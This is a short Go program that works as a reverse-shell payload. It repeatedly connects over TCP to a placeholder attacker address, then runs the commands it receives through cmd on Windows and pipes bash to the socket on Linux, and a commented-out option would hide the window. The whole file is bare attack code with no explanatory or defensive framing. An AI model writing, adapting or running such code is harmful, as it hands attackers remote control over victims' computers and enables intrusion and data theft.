package main

import (
	"bufio"
	"net"
	"os/exec"
	"runtime"

	// "syscall"
	"time"
)

func executePayload(srcAddress string) {
	targetOs := runtime.GOOS

checkConnection:
	for {
		checkConn, err := net.Dial("tcp", srcAddress)
		if err != nil {
			time.Sleep(3 * time.Second)
		} else {
			checkConn.Close()
			break
		}
	}

	conn, _ := net.Dial("tcp", srcAddress)

	for {
		status, isDisconnected := bufio.NewReader(conn).ReadString('\n')
		if isDisconnected != nil {
			goto checkConnection
		}
		switch targetOs {
		case "windows":
			shell := exec.Command("cmd", "/C", status)
			// shell.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			output, _ := shell.Output()
			conn.Write([]byte(output))
		case "linux":
			shell := exec.Command("/bin/bash")
			shell.Stdin = conn
			shell.Stdout = conn
			shell.Stderr = conn
			shell.Run()
		}
	}
}

func main() {
	srcAddress := "<ATTCKER_ADDRESS>"
	executePayload(srcAddress)
}
